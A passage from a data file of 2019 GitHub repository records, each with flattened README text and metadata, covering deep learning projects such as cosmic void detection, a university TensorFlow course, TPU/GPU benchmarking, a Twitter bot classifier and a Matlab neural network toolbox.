2017 MaskFusion Real Time Recognition Tracking and Reconstruction of Multiple Moving Objects https arxiv org pdf 1804 09194 ISMAR 2018 CVPR 2019 Revealing Scenes by Inverting Structure from Motion Reconstructions Deep Reinforcement Learning of Volume guided Progressive View Inpainting for 3D Point Scene Completion from a Single Depth Image What Do Single view 3D Reconstruction Networks Learn Learning View Priors for Single view 3D Reconstruction Normalized Object Coordinate Space for Category Level 6D Object Pose and Size Estimation Extreme Relative Pose Estimation for RGB D Scans via Scene Completion Understanding the Limitations of CNN based Absolute Camera Pose Regression DenseFusion 6D Object Pose Estimation by Iterative Dense Fusion Segmentation driven 6D Object Pose Estimation PointFlowNet Learning Representations for Rigid Motion Estimation from Point Clouds From Coarse to Fine Robust Hierarchical Localization at Large Scale ICRA 2019 ICRA 2019 Autonomous Exploration Reconstruction and Surveillance of 3D Environments Aided by Deep Learning Sparse2Dense From Direct Sparse Odometry to Dense 3D Reconstruction A Variational Observation Model of 3D Object for Probabilistic Semantic SLAM Hierarchical Depthwise Graph Convolutional Neural Network for 3D Semantic Segmentation of Point Clouds Robust 3D Object Classification by Combining Point Pair Features and Graph Convolution A Fast and Robust 3D Person Detector and Posture Estimator for Mobile Robotic Applications ScalableFusion High Resolution Mesh Based Real Time 3D Reconstruction Dense 3D Visual Mapping Via Semantic Simplification 2D3D MatchNet Learning to Match Keypoints across 2D Image and 3D Point Cloud Prediction Maps for Real Time 3D Footstep Planning in Dynamic Environments DeepFusion Real Time Dense 3D Reconstruction for Monocular SLAM Using Single View Depth and Gradient Predictions MVX Net Multimodal VoxelNet for 3D Object Detection Sparse2Dense From Direct Sparse Odometry to Dense 3D Reconstruction On Line 3D Active Pose Graph SLAM Based on Key Poses Using Graph Topology and Sub Maps Tightly Coupled Visual Inertial Localization and 3D Rigid Body Target Tracking,2019-09-07T09:37:00Z,2019-10-27T03:04:13Z,n/a,kabniz,User,1,1,2,3,master,kabniz,1,0,0,0,0,0,0
PacktPublishing,Advanced-Deep-Learning-with-R,n/a,,2019-09-16T09:45:01Z,2019-12-13T01:38:34Z,n/a,PacktPublishing,Organization,2,1,2,22,master,bkrai#packtnazias,2,0,0,0,0,0,0
ZehaoJin,Deep-Learning-Cosmic-Void-2019,n/a,Deep Learning Cosmic Void 2019 This project uses Convolutional Neural Network to spot cosmic voids dark matter from a given galaxy catalog It also constructs a pipeline for training Astrophysics datasets that can be used in many other cases with little modification Collaborator Joshua Yao Yu Lin https github com joshualin24 PhD student in university of illinois urbana champaign Data from Arka Banerjee Post Doc in Standford Codes are ran on NCSA Hardware Accelerated Learning HAL cluster https wiki ncsa illinois edu display ISL20 HAL cluster This work utilizes resources supported by the National Science Foundations Major Research Instrumentation program grant 1725729 as well as the University of Illinois at Urbana Champaign countsresult png result demofigure2 png Procedure Arka ran cosmology simulations on a 1050 1050 1050 1Gpc h 3 3D box to simulate an area of cosmos and generate galaxy catalogs out of them He then ran the old school astronomy void finder more about that in the last section to detect cosmic voids inside that area so that we have a catalog of galaxys as well as a corrsponding catalog of voids We cut this1050 1050 1050 box into about 10 thousands small 224 224 224 boxs For each small boxes we then apply Cloud In Cell interpolation on the galaxy catalog to generate a real image like convolution instead of just a scatter plot Then this small convoluted box is squeezed in Z direction simply sum along z axis results in a 2D 224 224 galaxy image Similiar steps are also applied to the void catalog giving us a 2D 224 224 void image Now we have 10 thousand galaxy 224 224 image and corresponding 10 thousand void 224 244 image ready for training We seperated 80 of data to be training set and remaining 20 as test set and send them into Convolutional Neural Network We mainly use pre trained ResNet https pytorch org hub pytorchvisionresnet But we rebuilt ResNet s last layer s architecture to be 56 56 224 224 void image are further resized into 56 56 ones befored being trained Therefore the modified ResNet will take in 224 224 galaxy image and finally outputs its prediction on the 56 56 void image Compare the loss between predicted void image and ground truth ResNet is able to learn how do to it better next time The whole dataset 10K entries are repeatedly trained for 20 times Result Although it seems like nerual network spoted some cosmic voids on the first sight it s important to note that our nerual network predicts every value around 0 5 instead of ranging from 0 1 That indicates that our nerual network is very uncertain when making the desicion Extending the training time and adds more data to be trained wwill certainly improve its performance since every of the 20 training episode is showing a signficant decrease in loss before and after that training episode result demofigure0 png result demofigure1 png result demofigure2 png result demofigure3 png result demofigure4 png result demofigure5 png result demofigure6 png result demofigure7 png Train void counts Since directly spot cosmic void from 2D galaxy images turns out to be a little hard as it shown above we decided to train nerual networks to count the total number of voids inside any 224 224 galaxy image The main difference here is this time we reconstruct ResNet s last layer s architecture to be just the number of voids The result after 20 times training episode can be summarized in the following plot where the red line is prediction truth It s obvious that our nerual network does detects some trend about number of voids With more training time it should do even better countsresult png Future work Both galaxies and cosmic voids are 3D objects but we are training based on 2D sequeezed image To resolve this problem we can handle the 3D 2D process more carefully For example we can do a 3D projection onto a 2D plate instead of just squeeze everything along one of the axises Another way is to directly train 3D galaxy map and 3D void map To achive that we will need to build a 3D neural network and the size of dataset will grow huge effectively 224 times the current size from 224 2 to 224 3 Much more computation power would be neccssary for that Void catalogs are generated by old school astronomy void finder What is does is to brute force drawing spheres inside the interested region When a sphere with radius bigger than preset value is drawn without including any galaxies that sphere is labeled as a void Such method is obviously very low efficient and it can easily miss irregular shaped voids To solve such problem as soon as our neural networks can successfully capture general feature of voids we can use the output prediction as the training ground truth for futher training That s a common training technique that has been used a lot For example in the case of detecting cancer tumor from chest X Ray images even the doctors who provide data are not able to label all tumors with perfect accuracy After training tumors labeled by doctors for a sufficiently long time nerual networks are set to training on their former output As a result the general feature of tumors are further emphasized and finally neural networks can spot tumor much better than many professional doctors,2019-09-09T18:38:12Z,2019-12-09T21:55:29Z,Python,ZehaoJin,User,1,1,2,8,master,ZehaoJin,1,0,0,0,0,0,0
mslehre,KI-Block,n/a,Neural Networks and Deep Learning Greifswald September 23 25 2019 Go to Moodle https moodle web uni greifswald de moodle course view php id 5405 for Q A forum feedback announcements quiz Get Started 1 Login to Moodle https moodle web uni greifswald de moodle course view php id 5405 and self subscribe if not already done Leave the Q A tab open in your browser 2 Login at https jupyterhub brain rz uni greifswald de and spawn Tensorflow 2 0 0 rc0 3 Open a terminal click below File then Terminal 4 Download the class material Copy and paste this command into a terminal git clone https github com mslehre KI Block git 5 Open KI Block gd lr ipynb Course Overview You will get practical knowledge to perform general machine learning and in particular computer vision tasks with TensorFlow 2 and the neccessary theoretical background to troubleshoot when transferring the knowledge to solve own problems Stochastic Gradient Descent Linear Regression with TensorFlow 2 Expore the Effect of Critical Parameters Derive and Optimize Fully Connected Neural Network for Regression Convolutional Neural Networks Architectures Filters Feature Maps Fooling a CNN Make it Think a Plant is a Cat,2019-08-15T11:25:53Z,2019-11-16T14:21:57Z,Jupyter Notebook,mslehre,Organization,4,1,2,63,master,MarioStanke,1,0,0,0,0,0,0
Emma926,paradnn,n/a,paradnn beta ParaDnn https github com Emma926 paradnn blob master paradnn png ParaDnn is a tool that generates parameterized deep neural network models It provides large end to end models covering current and future applications and parameterizing the models to explore a much larger design space of DNN model attributes If you use paradnn for your project please cite our paper Wang Yu Emma and Gu Yeon Wei and David Brooks Benchmarking TPU GPU and CPU Platforms for Deep Learning arXiv preprint arXiv 1907 10701 2019 articlewang2019benchmarking title Benchmarking TPU GPU and CPU Platforms for Deep Learning author Wang Yu Emma and Wei Gu Yeon and Brooks David journal arXiv preprint arXiv 1907 10701 year 2019 See this link https arxiv org abs 1907 10701 for the PDF This repository also includes the analysis tools demonstrated in the paper Canonical Models ParaDnn generates three types of multi layer models fully connected convolutional and recurrent models summarized as below paradnnmodels https github com Emma926 paradnn blob master paradnnmodels png Requirements python 3 0 TensorFlow 1 6 Test python test py usetpu USETPU Run on CPUs For example to run FC models on CPUs first modify the hyperparameter ranges in paradnn run fccpu sh and do cd paradnn bash run fccpu sh Run on TPUs To run FC models on TPUs first modify the hyperparameter ranges in file paradnn run fctpu sh and do cd paradnn bash run fctpu sh To collect TPU traces first modify the hyperparameter ranges and gcpbucket in file paradnn run fctputrace sh and do cd paradnn bash run fctputrace sh To download the data from the traces cd scripts bash downloadjsonfilesparallel py tracefoldername gcpbucket To parse the downloaded data bash parsejsonfiles py tracefoldername Collect performance data from execution logs cd scripts python getperf py Run the analysis tools cd scripts plotting jupyter notebook Yu Emma Wang 9 13 2019,2019-09-13T20:28:14Z,2019-10-22T06:23:15Z,Jupyter Notebook,Emma926,User,1,1,3,19,master,Emma926#lijiansong,2,0,0,0,1,0,1
saeedalam,DeepLearning,n/a,DeepLearning Deep learning Codes I test new Machine Learning solutions and share them in github,2019-08-29T23:17:04Z,2019-09-04T10:01:33Z,Jupyter Notebook,saeedalam,User,1,1,0,22,master,saeedalam,1,0,0,0,0,0,0
SmitaPaul7000,DeepLearning,n/a,,2019-08-30T11:10:34Z,2019-09-09T17:03:56Z,Jupyter Notebook,SmitaPaul7000,User,1,1,0,9,master,SmitaPaul7000,1,0,0,0,0,0,0
zhangyu13141,DeepLearning,n/a,Python Make your own neural network 2018 TensorFlow Keras 2018 03 B https www bilibili com video av7552365 from search seid 824260649150692629 B https www bilibili com video av7717884,2019-08-21T13:33:52Z,2019-12-03T10:29:58Z,Jupyter Notebook,zhangyu13141,User,1,1,0,29,master,zhangyu13141,1,0,0,0,0,0,1
18846935350,DeepLearning,n/a,,2019-09-11T02:10:49Z,2019-09-11T12:47:45Z,Python,18846935350,User,1,1,0,2,Mask-Rcnn,597785564,1,0,0,0,0,0,0
focalpoint94,DeepLearning,n/a,,2019-09-12T06:39:22Z,2019-12-04T13:05:59Z,Python,focalpoint94,User,1,1,0,32,master,focalpoint94,1,0,0,0,0,0,0
mehra-deepak,Deep-Learning-with-Grokking-Deep-Learning,n/a,Desiging Neural Network Architecture from Elementary Level This Repo consist Deep Learning using Numpy and Python,2019-08-17T20:17:49Z,2019-12-13T08:07:32Z,Jupyter Notebook,mehra-deepak,User,1,1,0,3,master,mehra-deepak,1,0,0,0,0,0,0
amChristonasis,Deep-Learning-Specialization-Coursera-Deep-Learning.ai,n/a,Deep Learning Specialization Coursera Deep Learning ai My solutions to the Deep Learning Specilization course by DeepLearning ai over at Coursera,2019-08-29T12:38:42Z,2019-11-22T12:37:22Z,Jupyter Notebook,amChristonasis,User,1,1,0,2,master,amChristonasis,1,0,0,0,0,0,0
gulshan-archive,Artificial-Intelligence-DeepLearning,n/a,Jupyter Notebooks to learn Artificial Intelligence Machine Learning Deep Learning from Basics to Advanced,2019-08-16T20:32:36Z,2019-11-26T01:27:26Z,Jupyter Notebook,gulshan-archive,User,1,1,0,17,master,gulshan-archive,1,0,0,0,0,0,0
paulonteri,DeepLearningIndaba-2019,n/a,,2019-08-25T12:05:58Z,2019-10-17T13:27:49Z,Jupyter Notebook,paulonteri,User,1,1,1,10,master,paulonteri,1,0,0,0,0,0,0
Nunez350,DeepLearningWithR,n/a,DeepLearningWithR,2019-09-16T14:12:55Z,2019-09-16T14:15:10Z,HTML,Nunez350,User,1,1,0,1,master,Nunez350,1,0,0,0,0,0,0
Thierryfe,DeepLearningEuroMillion,n/a,DeepLearningEuroMillion,2019-09-11T15:01:44Z,2019-12-12T18:51:20Z,Python,Thierryfe,User,1,1,0,74,master,Hyddrogene#Thierryfe#Lusgem#CChaudeurdy#abzechix#Exypte#ChonChorizo,7,0,0,0,0,0,1
NicolaBernini,DeepLearning101,n/a,DeepLearning101 Deep Learning Code Tutorial Experiments Pytorch Guides In Depth Pytorch Guide Data Loading and Visualization https drive google com open id 1T065t7jOPnJorwBraXLcvdWpH1gfRmopkENaRB2J1k Content Framework Concepts Datasets Representations images tensors Data Loading facilities iterators Visualization,2019-08-17T10:22:10Z,2019-09-19T12:49:06Z,n/a,NicolaBernini,User,2,1,0,3,master,NicolaBernini,1,0,0,0,0,0,1
jazzisfuture,deepLearningNote,n/a,deepLearningNote,2019-09-04T15:11:03Z,2019-09-07T08:32:39Z,n/a,jazzisfuture,User,1,1,0,7,master,jazzisfuture,1,0,0,0,0,0,0
ldgcug,DeepReinforcementLearning-Tensorflow,n/a,,2019-08-08T10:58:48Z,2019-09-20T11:50:02Z,Python,ldgcug,User,1,1,0,16,master,ldgcug,1,0,0,0,0,0,0
li-xicai,DeepLearning-Infrared,n/a,DeepLearning Infrared Application Research of YOLO Network in Low Resolution Infrared Face Detection and Tracking,2019-08-25T16:01:15Z,2019-10-18T02:56:46Z,n/a,li-xicai,User,1,1,0,1,master,li-xicai,1,0,0,0,0,0,0
nasirtrekker,DeepLearning_MaskRCNN,n/a,Detect Car damage with MaskRCNN This repo contain application of DeepLearning MaskRCNN to detect car damage following guidelines from Matterport https github com matterport MaskRCNN Implementation of example code and suggestions from following blog posts links https www analyticsvidhya com blog 2018 07 building mask r cnn model detecting damage cars python https towardsdatascience com cnn application detecting car exterior damage full implementable code 1b205e3cb48c,2019-08-22T16:24:54Z,2019-10-07T12:22:14Z,Jupyter Notebook,nasirtrekker,User,1,1,0,0,master,,0,0,0,0,0,0,0
wjddyd66,DeepLearning2,n/a,DeepLearning2 Category 1 WordNet Corpus 2 KoNLPy KoNLPy 3 word2vec word2vec 4 Fast word2vec Fastword2vec 5 RNN RNN 6 LSTM LSTM 7 seq2seq seq2seq 8 Attention Attention 9 2 common dataset wjddyd66 naver com,2019-09-05T04:21:35Z,2019-12-12T09:38:39Z,Jupyter Notebook,wjddyd66,User,1,1,0,10,master,wjddyd66,1,0,0,0,0,0,0
mandysack,DeepLearningAnalyticsProject,n/a,DeepLearningAnalyticsProject Introduction project for Deep Learning Analytics Mandy Sack 2019 Objectives The goal of this project is to use a twitter dataset to determine if the an account is a bot or not using Tensorflow s DNNClassifier Using Tensorflow with GPU will enable an increase in performance effeciency Attribute Information The data has already seperated data by bot referred to as a Content Polluter and a not bot referred to as a Legitimate User There has been a column added to the datasets labeled Bad User to identify this attribute prior to merging the datasets Bad User 1 Content Polluter 0 Legitimate User 5 Features NumberOfFollowings NumberOfFollowers NumberOfTweets LengthOfScreenName LengthOfDescriptionInUserProfile 3 non numeric features we re removed during the data cleasing as they did not provide information that would assist in proper classification UserID CreatedAt CollectedAt Files Included In This Package README md This file Deep Learning Project ipynb Notebook that will run the DLA project DataExploration ipynb Notebook that shows some of the commands used for exploring the dataset data contentpolluters csv Provides content polluters twitter account information and is classified as a Bad User data legitimateusers csv Provides legitimate users twitter account information and is classified as a Non Bad User data mergedDataclassified csv Provides both content polluters legitimate users twitter account information sorted by the CollectedAt column data trainingDataclassified csv Provides the mergedData that has removed the 3 non numerical columns as well as randomized for training purposes docs socialhoneypoticwsm2011 pdf Documentation regarding the data docs SevenMonthswiththeDevilsStudy pdf White paper that used the Twitter data Environment Setup For Running Experiment You will need python3 anaconda to run this experiment If you are going to run this without a GPU then you will want to modify the notebooks to only import tensorflow instead of tensorflow gpu Create an anaconda environment using the following commands conda create n dla python 3 6 tensorflow gpu numpy matplotlib pandas scipy conda activate dla If you are using a NVIDIA Jetson TX2 you will not be able to use conda You will need to install all of the python modules seperately tensorflow gpu numpy matplotlib pandas scipy Running The Experiment There are two ways to run this experiment If you are going to use Jupyter Notebook execute all cells in Deep Learning Project ipynb From the command line you can simply run demo Results The last cell the Jupyter Notebook and the last output of the demo script provide the result of b 1 Meaning that it did properly classify a bot from our contentpolluters csv file as a bot You could take any row from either the contentpolluters csv file or legitimateusers csv file to determine if the classifier is working The accuracy is currently at 89 which is not great and this would need this to be greatly improved to be above 95 Initially the accuracy was at 86 and some improvement was able to be reached using variable modifications Information on the data The dataset used is caverlee 2011 from the website https botometer iuni iu edu bot repository datasets html Reference Lee Kyumin Brian David Eoff and James Caverlee Seven Months with the Devils A Long Term Study of Content Polluters on Twitter ICWSM 2011,2019-08-15T22:12:13Z,2019-10-17T13:26:42Z,Jupyter Notebook,mandysack,User,1,1,0,30,master,mandysack,1,0,0,0,3,0,0
sam7708,DeepLearning_practice,n/a,,2019-08-30T09:18:00Z,2019-09-21T08:47:40Z,Jupyter Notebook,sam7708,User,0,1,0,2,master,sam7708,1,0,0,0,0,0,0
rozos,DeepLearningToolbox,n/a,Deprecation notice This toolbox is outdated and no longer maintained There are much better tools available for deep learning than this toolbox e g Theano http deeplearning net software theano torch http torch ch or tensorflow http www tensorflow org I would suggest you use one of the tools mentioned above rather than use this toolbox Best Rasmus DeepLearnToolbox A Matlab toolbox for Deep Learning Deep Learning is a new subfield of machine learning that focuses on learning deep hierarchical models of data It is inspired by the human brain s apparent deep layered hierarchical architecture A good overview of the theory of Deep Learning theory is Learning Deep Architectures for AI http www iro umontreal ca bengioy papers ftmlbook pdf For a more informal introduction see the following videos by Geoffrey Hinton and Andrew Ng The Next Generation of Neural Networks http www youtube com watch v AyzOUbkUf3M Hinton 2007 Recent Developments in Deep Learning http www youtube com watch v VdIURAu1 aU Hinton 2010 Unsupervised Feature Learning and Deep Learning http www youtube com watch v ZmNOAtZIgIk Ng 2011 If you use this toolbox in your research please cite Prediction as a candidate for learning deep hierarchical models of data http www2 imm dtu dk pubdb views publicationdetails php id 6284 MASTERSTHESISIMM2012 06284 author R B Palm title Prediction as a candidate for learning deep hierarchical models of data year 2012 Contact rasmusbergpalm at gmail dot com Directories included in the toolbox NN A library for Feedforward Backpropagation Neural Networks CNN A library for Convolutional Neural Networks DBN A library for Deep Belief Networks SAE A library for Stacked Auto Encoders CAE A library for Convolutional Auto Encoders util Utility functions used by the libraries data Data used by the examples tests unit tests to verify toolbox is working For references on each library check REFS md Setup 1 Download 2 addpath genpath DeepLearnToolbox Example Deep Belief Network matlab function testexampleDBN load mnistuint8 trainx double trainx 255 testx double testx 255 trainy double trainy testy double testy ex1 train a 100 hidden unit RBM and visualize its weights rand state 0 dbn sizes 100 opts numepochs 1 opts batchsize 100 opts momentum 0 opts alpha 1 dbn dbnsetup dbn trainx opts dbn dbntrain dbn trainx opts figure visualize dbn rbm1 W Visualize the RBM weights ex2 train a 100 100 hidden unit DBN and use its weights to initialize a NN rand state 0 train dbn dbn sizes 100 100 opts numepochs 1 opts batchsize 100 opts momentum 0 opts alpha 1 dbn dbnsetup dbn trainx opts dbn dbntrain dbn trainx opts unfold dbn to nn nn dbnunfoldtonn dbn 10 nn activationfunction sigm train nn opts numepochs 1 opts batchsize 100 nn nntrain nn trainx trainy opts er bad nntest nn testx testy assert er 0 10 Too big error Example Stacked Auto Encoders matlab function testexampleSAE load mnistuint8 trainx double trainx 255 testx double testx 255 trainy double trainy testy double testy ex1 train a 100 hidden unit SDAE and use it to initialize a FFNN Setup and train a stacked denoising autoencoder SDAE rand state 0 sae saesetup 784 100 sae ae1 activationfunction sigm sae ae1 learningRate 1 sae ae1 inputZeroMaskedFraction 0 5 opts numepochs 1 opts batchsize 100 sae saetrain sae trainx opts visualize sae ae1 W1 2 end Use the SDAE to initialize a FFNN nn nnsetup 784 100 10 nn activationfunction sigm nn learningRate 1 nn W1 sae ae1 W1 Train the FFNN opts numepochs 1 opts batchsize 100 nn nntrain nn trainx trainy opts er bad nntest nn testx testy assert er 0 16 Too big error Example Convolutional Neural Nets matlab function testexampleCNN load mnistuint8 trainx double reshape trainx 28 28 60000 255 testx double reshape testx 28 28 10000 255 trainy double trainy testy double testy ex1 Train a 6c 2s 12c 2s Convolutional neural network will run 1 epoch in about 200 second and get around 11 error With 100 epochs you ll get around 1 2 error rand state 0 cnn layers struct type i input layer struct type c outputmaps 6 kernelsize 5 convolution layer struct type s scale 2 sub sampling layer struct type c outputmaps 12 kernelsize 5 convolution layer struct type s scale 2 subsampling layer cnn cnnsetup cnn trainx trainy opts alpha 1 opts batchsize 50 opts numepochs 1 cnn cnntrain cnn trainx trainy opts er bad cnntest cnn testx testy plot mean squared error figure plot cnn rL assert er 0 12 Too big error Example Neural Networks matlab function testexampleNN load mnistuint8 trainx double trainx 255 testx double testx 255 trainy double trainy testy double testy normalize trainx mu sigma zscore trainx testx normalize testx mu sigma ex1 vanilla neural net rand state 0 nn nnsetup 784 100 10 opts numepochs 1 Number of full sweeps through data opts batchsize 100 Take a mean gradient step over this many samples nn L nntrain nn trainx trainy opts er bad nntest nn testx testy assert er 0 08 Too big error ex2 neural net with L2 weight decay rand state 0 nn nnsetup 784 100 10 nn weightPenaltyL2 1e 4 L2 weight decay opts numepochs 1 Number of full sweeps through data opts batchsize 100 Take a mean gradient step over this many samples nn nntrain nn trainx trainy opts er bad nntest nn testx testy assert er 0 1 Too big error ex3 neural net with dropout rand state 0 nn nnsetup 784 100 10 nn dropoutFraction 0 5 Dropout fraction opts numepochs 1 Number of full sweeps through data opts batchsize 100 Take a mean gradient step over this many samples nn nntrain nn trainx trainy opts er bad nntest nn testx testy assert er 0 1 Too big error ex4 neural net with sigmoid activation function rand state 0 nn nnsetup 784 100 10 nn activationfunction sigm Sigmoid activation function nn learningRate 1 Sigm require a lower learning rate opts numepochs 1 Number of full sweeps through data opts batchsize 100 Take a mean gradient step over this many samples nn nntrain nn trainx trainy opts er bad nntest nn testx testy assert er 0 1 Too big error ex5 plotting functionality rand state 0 nn nnsetup 784 20 10 opts numepochs 5 Number of full sweeps through data nn output softmax use softmax output opts batchsize 1000 Take a mean gradient step over this many samples opts plot 1 enable plotting nn nntrain nn trainx trainy opts er bad nntest nn testx testy assert er 0 1 Too big error ex6 neural net with sigmoid activation and plotting of validation and training error split training data into training and validation data vx trainx 1 10000 tx trainx 10001 end vy trainy 1 10000 ty trainy 10001 end rand state 0 nn nnsetup 784 20 10 nn output softmax use softmax output opts numepochs 5 Number of full sweeps through data opts batchsize 1000 Take a mean gradient step over this many samples opts plot 1 enable plotting nn nntrain nn tx ty opts vx vy nntrain takes validation set as last two arguments optionally er bad nntest nn testx testy assert er 0 1 Too big error Bitdeli Badge https d2weczhvl823v0 cloudfront net rasmusbergpalm deeplearntoolbox trend png https bitdeli com free Bitdeli Badge,2019-09-10T12:07:37Z,2019-11-15T07:57:29Z,MATLAB,rozos,User,1,1,0,0,master,,0,0,0,0,0,0,0
BCornelsen,DeepLearning_Practices,n/a,,2019-09-02T13:02:10Z,2019-09-02T18:44:23Z,Jupyter Notebook,BCornelsen,User,1,1,0,0,master,,0,0,0,0,0,0,0
wangyf6891,DeepLearning.ai,n/a,DeepLearning ai,2019-08-26T12:58:51Z,2019-10-26T02:26:14Z,Jupyter Notebook,wangyf6891,User,1,1,0,2,master,wangyf6891,1,0,0,0,0,0,0
zfscgy,DeepLearningCodes,n/a,Deep Learning Codes This repository is used to implement some deep learning models I ve read in the papers or books or just come up in my mind The models are mainly implemented using tf keras Quick Start Using RunTask py Modify it change working directory and system path to your own example python RunTask py gru4rec Already implemented models updating 2019 9 16 Transfer Learning Siamese Neural Networks for One shot Image Recognition ICML2015 https www cs cmu edu rsalakhu papers oneshot1 pdf main code in Tasks TransferLearning OneShotLearningOmniglot py 2019 9 26 Session Recommendation A Simple Convolutional Generative Network for Next Item Recommendation WSDM 2018 main code in Tasks SessionRecommendation SimpleConvNetForNextItem py 2019 10 11 Session Recommendation Recurrent Neural Networks with Top k Gains for Session based Recommendations ACM CIKM 2018 https arxiv org abs 1706 03847 2019 10 14 Image Generation Unsupervised Representation Learning with Deep Convolutional Generative Adversarial Networks ICLR 2016 https arxiv org abs 1511 06434 Datasets Added Omniglot Dataset Handwriting symbols from 26 languages Labeled Faces in the Wild Deepfunneled deleted folders with only one picture Movielens Latest 100k and 1M from official website Anime Faces 6000 anime faces from internet width and height same and larger than 10KB YooChoose Click YouChoose click data in sequence representation,2019-09-16T14:34:11Z,2019-12-11T09:56:32Z,Python,zfscgy,User,0,1,1,18,master,zfscgy,1,0,0,0,0,0,0
mk60991,DeepLearning-with-keras,n/a,DeepLearning with keras deeplearning turorial with keras in python,2019-08-14T10:48:01Z,2019-10-05T00:26:20Z,Jupyter Notebook,mk60991,User,2,1,0,10,master,mk60991,1,0,0,1,0,2,0
uchreet-godara,Machine-learning-deep-learning,n/a,,2019-08-28T01:03:53Z,2019-08-28T02:02:06Z,Jupyter Notebook,uchreet-godara,User,1,1,0,1,master,uchreet-godara,1,0,0,0,0,0,0
sunghoonhong,DeepRL,n/a,All about Deep Reinforcement Learning I work in TensorFlow2 Framework Environments Snakev1 Observation space RGB array or Extracted features Action space Discrete 3 Go Straight Turn Left Turn Right Reward scheme Dense or Sparse Snakev2 Observation space RGB array Action space Box 2 Speed 0 0 1 0 Angle 1 0 1 0 Reward scheme Dense or Sparse RL Agents Randomly TODOs PPO Proximal Policy Optimization DDPG Deep Deterministic Policy Gradient A3C Asynchronous Advantage Actor Critic DQN Deep Q Network IL Agents TODOs BC Behavior Cloning GAIL Generative Adversarial Imitation Learning VAIL Variational GAIL MAIL Mature GAIL DI GAIL Directed Info GAIL DI MAIL Mature DI GAIL,2019-09-07T13:02:37Z,2019-11-08T07:50:50Z,Python,sunghoonhong,User,1,1,0,41,master,sunghoonhong#dependabot[bot],2,0,0,1,0,1,1
sirmurphalot,SAMSI_DeepLearningF19,n/a,SAMSIDeepLearningF19 Repository for the various homework and versions of said homework for SAMSI s Deep Learning class Fall 2019,2019-09-07T18:24:09Z,2019-11-22T15:22:31Z,Jupyter Notebook,sirmurphalot,User,3,1,0,16,master,sirmurphalot#stillill#cmosso#dhruv-pat,4,0,0,0,0,0,0
H-Designer,DeepLearning-Bank_Card_OCR,n/a,,2019-08-08T12:47:58Z,2019-08-22T02:00:03Z,Python,H-Designer,User,1,1,0,0,master,,0,0,0,0,0,0,0
MartijnNaaijer,DeepReinforcementLearning_ContinuousControl,n/a,Continuous Control alt text https video udacity data com topher 2018 June 5b1ea778reacher reacher gif Follow me In this repository a continuous control problem is solved using deep reinforcement learning more specifically with Deep Deterministic Policy Gradient The environment which is used here is Unity s Reacher In this environment a double jointed arm needs to reach moving target locations The environment has two versions The first version contains a single agent The second version contains 20 identical agents each with its own copy of the environment In this repository only the second version is considered On every time step that the hand is in the target location the agent gets a reward of 0 1 The goal is to remain in the target location as long as possible The observation space consists of 33 variables corresponding to position rotation velocity and angular velocities of the arm Each action is a vector with four numbers corresponding to torque applicable to two joints Every entry in the action vector should be a number between 1 and 1 After each episode the rewards of the 20 agents are averaged The environment is solved if the average score is at least 30 over 100 subsequent episodes If you want to run the file reachercontinuouscontrol ipynb on your own computer install Anaconda Python3 then download this repository and install the unity environment You can download it here Linux https s3 us west 1 amazonaws com udacity drlnd P2 Reacher ReacherLinux zip MacOS https s3 us west 1 amazonaws com udacity drlnd P2 Reacher Reacher app zip Windows32bit https s3 us west 1 amazonaws com udacity drlnd P2 Reacher ReacherWindowsx86 zip Windows 64 bit https s3 us west 1 amazonaws com udacity drlnd P2 Reacher ReacherWindowsx8664 zip Then place the file in the p2continuous control folder in the DRLND GitHub https github com udacity deep reinforcement learning repository and unzip or decompress the file Finally run the notebook reachercontinuouscontrol ipynb,2019-08-13T19:34:59Z,2019-08-21T21:25:05Z,Jupyter Notebook,MartijnNaaijer,User,1,1,0,6,master,MartijnNaaijer,1,0,0,0,0,0,0
shravankshenoy,DeepLearningAlgoFromScratch,n/a,DeepLearningAlgoFromScratch Implementation of Deep Learning Models using just Numpy and applying them on real world datasets Note If the Jupyter notebook is not loading copy the URL of the Jupyter notebook in https nbviewer jupyter org,2019-08-28T10:34:53Z,2019-11-23T11:45:34Z,Jupyter Notebook,shravankshenoy,User,1,1,0,11,master,shravankshenoy,1,0,0,0,0,0,0
QJSQJS,DeepLearning_book_paper_webaddress,n/a,DeepLearningbookpaperwebaddress,2019-09-03T09:15:52Z,2019-09-03T09:18:18Z,n/a,QJSQJS,User,1,1,0,1,master,QJSQJS,1,0,0,0,0,0,0
subhrockzz,DEEP_LEARNING,n/a,DEEPLEARNING,2019-08-07T04:32:39Z,2019-08-07T04:34:56Z,Jupyter Notebook,subhrockzz,User,1,1,0,2,master,subhrockzz,1,0,0,0,0,0,0
aliabbas101,Deep-Learning,n/a,,2019-09-17T08:24:18Z,2019-10-02T04:02:58Z,Jupyter Notebook,aliabbas101,User,1,1,0,2,master,aliabbas101,1,0,0,0,0,0,0
sinha-pulaks,Machine-Learning-and-Deep-Learning,n/a,Machine Learning and Deep Learning This repo contains various different machine learning and deep learning models and their implementation on some famous datasets,2019-08-21T17:33:23Z,2019-08-21T18:17:41Z,Jupyter Notebook,sinha-pulaks,User,1,1,0,9,master,sinha-pulaks,1,0,0,0,0,0,0
Hyukju-Sohn,Deep-Learning,n/a,,2019-08-13T04:33:04Z,2019-08-23T10:32:54Z,Python,Hyukju-Sohn,User,2,1,0,10,master,Hyukju-Sohn,1,0,0,0,0,0,3
KarthikUdyawar,Deep-Learning,n/a,Deep Learning Upgraded neural network,2019-08-31T11:37:51Z,2019-09-07T12:57:30Z,Python,KarthikUdyawar,User,1,1,0,3,master,KarthikUdyawar,1,0,0,0,0,0,0
HyowonAn,deep-learning,n/a,deep learning Deep Learning Skill using Python and Keras,2019-08-26T08:03:36Z,2019-11-14T08:06:59Z,Python,HyowonAn,User,1,1,0,10,master,HyowonAn,1,0,0,0,0,0,0
MyXiaoxin,deep-learning,n/a,deep learning 1 GPU 2 GPUCPU 3 LeNet5 1 2 2 CCF AAAICVPRICCVICDMIJCAIKDD 3 4 5 idea 6 Computer VisionAICVPR300 https www xuebuyuan com category VisionVision formulation AlancontextVisionliteraturesurveyvisionAlan topicvision Sampling particle filtering Statistical Physicsvisionlearning Tracking video optimization Control theory Alancontrol theoryPeano Baker seriessemi supervised learning Graphical model information theory information geometry Visionpapertheoretical contribution visionVisionvision paper Visionvisionvisionvideo codingsignal processing medical imagevisionvision face recognitiontopictopicpaper90 FRGCassume100 subspace kernel svm boosting trick Vision computer vision,2019-08-12T03:32:55Z,2019-12-07T01:01:17Z,Python,MyXiaoxin,User,1,1,0,47,master,MyXiaoxin,1,0,0,0,0,0,0
